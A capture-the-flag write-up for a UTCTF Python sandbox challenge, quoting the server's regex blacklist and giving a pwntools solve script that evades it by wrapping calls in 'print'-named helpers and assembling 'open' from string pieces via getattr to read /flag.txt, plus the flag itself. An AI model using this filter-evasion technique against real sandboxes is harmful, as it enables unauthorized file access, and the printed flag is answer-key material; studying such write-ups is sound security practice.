#### Challenge:

Upload a Python file that can be run by invoking the python command, and we will run it for you. To do so, send the bytes over the stream, and close the write half. `stdout` will be sent back. For security reasons, we may refuse to run your file if we detect dangerous strings. There is a byte limit and a timeout.

`nc misc.utctf.live 4353`

---

#### Solution:

- if we try to read the `/flag.txt` directly we are blocked by blacklist, only allowed function is `print()`

```console
Blacklist: (eval)|(import)|(open)|(with)|(as)|(from)|(lambda)|(\s*print\s*=\s*)|(?P<paren>\()
Whitelist: (\s*print\s*(?P<paren>\())
```

- we can invoke any `.*print(.*)` functions, so to invoke other functions we can pass it as argument to function that will rename it locally
- second issue is that function `open` is also blacklisted, to get around this we can retrieve `open` function with string thanks to `getattr` + `__builtins__`

```python
#!/usr/bin/env python3
from pwn import *
import base64

context.log_level = 'error'
r = remote('misc.utctf.live', 4353)

script = '''
def _print(print, x):
    return print(x)


def __print(print, x, y):
    return print(x, y)


def ___print(print):
    return print()


m = 'o'
m += 'p'
m += 'e'
m += 'n'
o = __print(getattr, __builtins__, m)
f = __print(o, "/flag.txt", "r")
flag = ___print(f.read)
print(flag, end='')
'''

r.send(script)
r.shutdown('send')
r.recv()
print(r.recv().decode('utf-8'), end='')
```

---

<details><summary>FLAG:</summary>

```
utflag{unclean_input}
```

</details>
<br/>
